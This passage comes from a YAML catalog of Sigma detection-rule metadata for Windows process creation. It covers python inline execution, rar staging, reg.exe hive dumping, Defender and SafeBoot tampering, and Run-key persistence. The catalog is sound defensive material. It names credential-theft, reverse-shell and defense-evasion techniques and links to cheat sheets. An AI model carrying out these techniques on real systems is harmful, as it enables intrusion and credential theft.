  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_python_adidnsdump.yml
  name: PUA - Adidnsdump Execution
  description: 'This tool enables enumeration and exporting of all DNS records in
    the zone for recon purposes of internal networks Python 3 and python.exe must
    be installed,

    Usee to Query/modify DNS records for Active Directory integrated DNS via LDAP

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1018
  tags:
  - attack.discovery
  - attack.t1018
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md#atomic-test-9---remote-system-discovery---adidnsdump
  false_positives:
  - Unknown
  notes: ''
- detection_id: 899133d5-4d7c-4a7f-94ee-27355c879d90
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_python_inline_command_execution.yml
  name: Python Inline Command Execution
  description: Detects execution of python using the "-c" flag. This is could be used
    as a way to launch a reverse shell or execute live python code.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://docs.python.org/3/using/cmdline.html#cmdoption-c
  - https://www.revshells.com/
  - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  false_positives:
  - Python libraries that use a flag starting with "-c". Filter according to your
    environment
  notes: ''
- detection_id: 480e7e51-e797-47e3-8d72-ebfce65b6d8d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_python_pty_spawn.yml
  name: Python Spawning Pretty TTY on Windows
  description: Detects python spawning a pretty tty
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5fc297ae-25b6-488a-8f25-cc12ac29b744
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_qemu_suspicious_execution.yml
  name: Potentially Suspicious Usage Of Qemu
  description: 'Detects potentially suspicious execution of the Qemu utility in a
    Windows environment.

    Threat actors have leveraged this utility and this technique for achieving network
    access as reported by Kaspersky.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090
  - T1572
  tags:
  - attack.command-and-control
  - attack.t1090
  - attack.t1572
  time_window: ''
  references:
  - https://securelist.com/network-tunneling-with-qemu/111803/
  - https://www.qemu.org/docs/master/system/invocation.html#hxtool-5
  false_positives:
  - Unknown
  notes: ''
- detection_id: 53ef0cef-fa24-4f25-a34a-6c72dfa2e6e2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_query_session_exfil.yml
  name: Query Usage To Exfil Data
  description: Detects usage of "query.exe" a system binary to exfil information such
    as "sessions" and "processes" for later use
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://twitter.com/MichalKoczwara/status/1553634816016498688
  false_positives:
  - Unknown
  notes: ''
- detection_id: e20b5b14-ce93-4230-88af-981983ef6e74
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_quickassist_execution.yml
  name: QuickAssist Execution
  description: 'Detects the execution of Microsoft Quick Assist tool "QuickAssist.exe".
    This utility can be used by attackers to gain remote access.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/
  - https://www.linkedin.com/posts/kevin-beaumont-security_ive-been-assisting-a-few-orgs-hit-with-successful-activity-7268055739116445701-xxjZ/
  - https://x.com/cyb3rops/status/1862406110365245506
  - https://learn.microsoft.com/en-us/windows/client-management/client-tools/quick-assist
  false_positives:
  - Legitimate use of Quick Assist in the environment.
  notes: ''
- detection_id: 6f3e2987-db24-4c78-a860-b4f4095a7095
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rar_compress_data.yml
  name: Files Added To An Archive Using Rar.EXE
  description: Detects usage of "rar" to add files to an archive for potential compression.
    An adversary may compress data (e.g. sensitive documents) that is collected prior
    to exfiltration in order to make it portable and minimize the amount of data sent
    over the network.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1560.001
  tags:
  - attack.collection
  - attack.t1560.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md
  - https://eqllib.readthedocs.io/en/latest/analytics/1ec33c93-3d0b-4a28-8014-dbdaae5c60ae.html
  false_positives:
  - Highly likely if rar is a default archiver in the monitored environment.
  notes: ''
- detection_id: faa48cae-6b25-4f00-a094-08947fef582f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rar_compression_with_password.yml
  name: Rar Usage with Password and Compression Level
  description: Detects the use of rar.exe, on the command line, to create an archive
    with password protection or with a specific compression level. This is pretty
    indicative of malicious actions.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1560.001
  tags:
  - attack.collection
  - attack.t1560.001
  time_window: ''
  references:
  - https://labs.sentinelone.com/the-anatomy-of-an-apt-attack-and-cobaltstrike-beacons-encoded-configuration/
  - https://ss64.com/bash/rar.html
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md
  false_positives:
  - Legitimate use of Winrar command line version
  - Other command line tools, that use these flags
  notes: ''
- detection_id: afe52666-401e-4a02-b4ff-5d128990b8cb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rar_susp_greedy_compression.yml
  name: Suspicious Greedy Compression Using Rar.EXE
  description: Detects RAR usage that creates an archive from a suspicious folder,
    either a system folder or one of the folders often used by attackers for staging
    purposes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://decoded.avast.io/martinchlumecky/png-steganography
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6bba49bf-7f8c-47d6-a1bb-6b4dece4640e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rasdial_execution.yml
  name: Suspicious RASdial Activity
  description: Detects suspicious process related to rasdial.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://twitter.com/subTee/status/891298217907830785
  false_positives:
  - False positives depend on scripts and administrative tools used in the monitored
    environment
  notes: ''
- detection_id: 4b8f6d3a-9c5e-4f2a-a7d8-6b9c3e5f2a8d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rdp_enable_or_disable_via_win32_terminalservicesetting_wmi_class.yml
  name: RDP Enable or Disable via Win32_TerminalServiceSetting WMI Class
  description: 'Detects enabling or disabling of Remote Desktop Protocol (RDP) using
    alternate methods such as WMIC or PowerShell.

    In PowerShell one-liner commands, the "SetAllowTSConnections" method of the "Win32_TerminalServiceSetting"
    class may be used to enable or disable RDP.

    In WMIC, the "rdtoggle" alias or "Win32_TerminalServiceSetting" class may be used
    for the same purpose.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.001
  - T1047
  tags:
  - attack.lateral-movement
  - attack.t1021.001
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://www.trendmicro.com/en_gb/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-x.html
  - https://github.com/HackTricks-wiki/hacktricks/blob/72f20a3fa26775b932bd819f1824c6377802a768/src/windows-hardening/basic-cmd-for-pentesters.md#firewall
  - https://github.com/Lifailon/RSA/blob/rsa/Sources/RSA-1.4.1.ps1#L1468
  false_positives:
  - Legitimate system administrators enabling RDP for remote support
  - System configuration scripts during deployment
  notes: ''
- detection_id: edadb1e5-5919-4e4c-8462-a9e643b02c4b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_rdrleakdiag_process_dumping.yml
  name: Process Memory Dump via RdrLeakDiag.EXE
  description: Detects the use of the Microsoft Windows Resource Leak Diagnostic tool
    "rdrleakdiag.exe" to dump process memory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://www.pureid.io/dumping-abusing-windows-credentials-part-1/
  - https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/
  - https://lolbas-project.github.io/lolbas/Binaries/Rdrleakdiag/
  - https://twitter.com/0gtweet/status/1299071304805560321?s=21
  - https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-a-technical-deep-dive
  false_positives:
  - Unlikely
  notes: ''
- detection_id: db1c21e4-cd66-4b4e-85ca-590f0780529c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reagentc_disable_windows_recovery_environment.yml
  name: Windows Recovery Environment Disabled Via Reagentc
  description: 'Detects attempts to disable windows recovery environment using Reagentc.

    ReAgentc.exe is a command-line tool in Windows used to manage the Windows Recovery
    Environment (WinRE).

    It allows users to enable, disable, and configure WinRE, which is used for troubleshooting
    and repairing common boot issues.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://www.elastic.co/security-labs/maas-appeal-an-infostealer-rises-from-the-ashes
  - https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/reagentc-command-line-options?view=windows-11
  false_positives:
  - Legitimate administrative activity
  notes: ''
- detection_id: de587dce-915e-4218-aac4-835ca6af6f70
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_add_run_key.yml
  name: Potential Persistence Attempt Via Run Keys Using Reg.EXE
  description: Detects suspicious command line reg.exe tool adding key to RUN key
    in Registry
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://app.any.run/tasks/9c0f37bc-867a-4314-b685-e101566766d7/
  - https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys
  - https://github.com/HackTricks-wiki/hacktricks/blob/e4c7b21b8f36c97c35b7c622732b38a189ce18f7/src/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.md
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reasons.
  - Legitimate administrator sets up autorun keys for legitimate reasons.
  - Discord
  notes: ''
- detection_id: d7662ff6-9e97-4596-a61d-9839e32dee8d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_add_safeboot.yml
  name: Add SafeBoot Keys Via Reg Utility
  description: Detects execution of "reg.exe" commands with the "add" or "copy" flags
    on safe boot registry keys. Often used by attacker to allow the ransomware to
    work in safe mode as some security products do not
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 0e0255bf-2548-47b8-9582-c0955c9283f5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_bitlocker.yml
  name: Suspicious Reg Add BitLocker
  description: Detects suspicious addition to BitLocker related registry keys via
    the reg.exe utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  tags:
  - attack.impact
  - attack.t1486
  time_window: ''
  references:
  - https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: b7966f4a-b333-455b-8370-8ca53c229762
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_credential_access_via_password_filter.yml
  name: Dropping Of Password Filter DLL
  description: Detects dropping of dll files in system32 that may be used to retrieve
    user credentials from LSASS
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1556.002
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.credential-access
  - attack.t1556.002
  time_window: ''
  references:
  - https://pentestlab.blog/2020/02/10/credential-access-password-filter-dll/
  - https://github.com/3gstudent/PasswordFilter/tree/master/PasswordFilter
  false_positives:
  - Unknown
  notes: ''
- detection_id: 48917adc-a28e-4f5d-b729-11e75da8941f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_defender_exclusion.yml
  name: Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE
  description: Detects the usage of "reg.exe" to add Defender folder exclusions. Qbot
    has been seen using this technique to add exclusions for folders within AppData
    and ProgramData.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/
  - https://redcanary.com/threat-detection-report/threats/qbot/
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: c11aecef-9c37-45a6-9c07-bc0782f963fd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_delete_runmru.yml
  name: RunMRU Registry Key Deletion
  description: 'Detects deletion of the RunMRU registry key, which stores the history
    of commands executed via the Run dialog.

    In the clickfix techniques, the phishing lures instruct users to open a run dialog
    through (Win + R) and execute malicious commands.

    Adversaries may delete this key to cover their tracks after executing commands.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.003
  tags:
  - attack.defense-evasion
  - attack.t1070.003
  time_window: ''
  references:
  - https://www.zscaler.com/blogs/security-research/coldriver-updates-arsenal-baitswitch-and-simplefix
  false_positives:
  - Unknown
  notes: ''
- detection_id: fc0e89b5-adb0-43c1-b749-c12a10ec37de
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_delete_safeboot.yml
  name: SafeBoot Registry Key Deleted Via Reg.EXE
  description: Detects execution of "reg.exe" commands with the "delete" flag on safe
    boot registry keys. Often used by attacker to prevent safeboot execution of security
    products
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 05b2aa93-1210-42c8-8d9a-2fcc13b284f5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_delete_services.yml
  name: Service Registry Key Deleted Via Reg.EXE
  description: Detects execution of "reg.exe" commands with the "delete" flag on services
    registry key. Often used by attacker to remove AV software services
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/2bcd5702a7565952c44075ac6fb946c7780526640d1264f692c7664c02c68465
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 8cbc9475-8d05-4e27-9c32-df960716c701
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_desktop_background_change.yml
  name: Potentially Suspicious Desktop Background Change Using Reg.EXE
  description: 'Detects the execution of "reg.exe" to alter registry keys that would
    replace the user''s desktop background.

    This is a common technique used by malware to change the desktop background to
    a ransom note or other image.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  - Persistence
  techniques:
  - T1112
  - T1491.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.impact
  - attack.t1112
  - attack.t1491.001
  time_window: ''
  references:
  - https://www.attackiq.com/2023/09/20/emulating-rhysida/
  - https://research.checkpoint.com/2023/the-rhysida-ransomware-activity-analysis-and-ties-to-vice-society/
  - https://www.trendmicro.com/en_us/research/23/h/an-overview-of-the-new-rhysida-ransomware.html
  - https://www.virustotal.com/gui/file/a864282fea5a536510ae86c77ce46f7827687783628e4f2ceb5bf2c41b8cd3c6/behavior
  - https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.WindowsDesktop::Wallpaper
  - https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.ControlPanelDisplay::CPL_Personalization_NoDesktopBackgroundUI
  false_positives:
  - Administrative scripts that change the desktop background to a company logo or
    other image.
  notes: ''
- detection_id: 24357373-078f-44ed-9ac4-6d334a668a11
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_direct_asep_registry_keys_modification.yml
  name: Direct Autorun Keys Modification
  description: Detects direct modification of autostart extensibility point (ASEP)
    in registry using reg.exe.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md
  - https://github.com/HackTricks-wiki/hacktricks/blob/e4c7b21b8f36c97c35b7c622732b38a189ce18f7/src/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.md
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reasons.
  - Legitimate administrator sets up autorun keys for legitimate reasons.
  - Discord
  notes: ''
- detection_id: a1b2c3d4-e5f6-a7b8-c9d0-e1f2a3b4c5d6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_disable_defender_wmi_autologger.yml
  name: Disabling Windows Defender WMI Autologger Session via Reg.exe
  description: 'Detects the use of reg.exe to disable the Event Tracing for Windows
    (ETW) Autologger session for Windows Defender API and Audit events.

    By setting the ''Start'' value to ''0'' for the ''DefenderApiLogger'' or ''DefenderAuditLogger''
    session, an attacker can prevent these critical security events

    from being logged, effectively blinding monitoring tools that rely on this data.
    This is a powerful defense evasion technique.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://research.splunk.com/endpoint/76406a0f-f5e0-4167-8e1f-337fdc0f1b0c/
  - https://docs.microsoft.com/en-us/windows/win32/etw/configuring-and-starting-an-autologger-session
  - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/
  - https://blog.malwarebytes.com/malwarebytes-news/2021/02/lazyscripter-from-empire-to-double-rat/
  - https://www.binarly.io/blog/design-issues-of-modern-edrs-bypassing-etw-based-solutions
  false_positives:
  - Highly unlikely
  notes: ''
- detection_id: 5e95028c-5229-4214-afae-d653d573d0ec
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_disable_sec_services.yml
  name: Security Service Disabled Via Reg.EXE
  description: Detects execution of "reg.exe" to disable security services such as
    Windows Defender.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://twitter.com/JohnLaTwC/status/1415295021041979392
  - https://github.com/gordonbay/Windows-On-Reins/blob/e587ac7a0407847865926d575e3c46f68cf7c68d/wor.ps1
  - https://vms.drweb.fr/virus/?i=24144899
  - https://bidouillesecurity.com/disable-windows-defender-in-powershell/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: fd877b94-9bb5-4191-bb25-d79cbd93c167
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_dumping_sensitive_hives.yml
  name: Dumping of Sensitive Hives Via Reg.EXE
  description: Detects the usage of "reg.exe" in order to dump sensitive registry
    hives. This includes SAM, SYSTEM and SECURITY hives.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  - T1003.004
  - T1003.005
  tags:
  - attack.credential-access
  - attack.t1003.002
  - attack.t1003.004
  - attack.t1003.005
  - car.2013-07-001
  time_window: ''
  references:
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  - https://eqllib.readthedocs.io/en/latest/analytics/aed95fc6-5e3f-49dc-8b35-06508613f979.html
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003/T1003.md
  - https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md#atomic-test-1---registry-dump-of-sam-creds-and-secrets
  false_positives:
  - Dumping hives for legitimate purpouse i.e. backup or forensic investigation
  notes: ''
- detection_id: 817f252c-5143-4dae-b418-48c3e9f63728
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_enable_windows_recall.yml
  name: Windows Recall Feature Enabled Via Reg.EXE
  description: 'Detects the enabling of the Windows Recall feature via registry manipulation.

    Windows Recall can be enabled by deleting the existing "DisableAIDataAnalysis"
    value, or setting it to 0.

    Adversaries may enable Windows Recall as part of post-exploitation discovery and
    collection activities.

    This rule assumes that Recall is already explicitly disabled on the host, and
    subsequently enabled by the adversary.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1113
  tags:
  - attack.collection
  - attack.t1113
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/client-management/manage-recall
  - https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-windowsai#disableaidataanalysis
  false_positives:
  - Legitimate use/activation of Windows Recall
  notes: ''
- detection_id: e0b0c2ab-3d52-46d9-8cb7-049dc775fbd1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_enumeration_for_credentials_in_registry.yml
  name: Enumeration for Credentials in Registry
  description: 'Adversaries may search the Registry on compromised systems for insecurely
    stored credentials.

    The Windows Registry stores configuration information that can be used by the
    system or other programs.

    Adversaries may query the Registry looking for credentials and passwords that
    have been stored for use by other programs or services

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552.002
  tags:
  - attack.credential-access
  - attack.t1552.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.002/T1552.002.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 62e0298b-e994-4189-bc87-bc699aa62d97
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_import_from_suspicious_paths.yml
  name: Potential Suspicious Registry File Imported Via Reg.EXE
  description: Detects the import of '.reg' files from suspicious paths using the
    'reg.exe' utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.t1112
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-import
  false_positives:
  - Legitimate import of keys
  notes: ''
- detection_id: 28ac00d6-22d9-4a3c-927f-bbd770104573
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_reg_lsa_disable_restricted_admin.yml
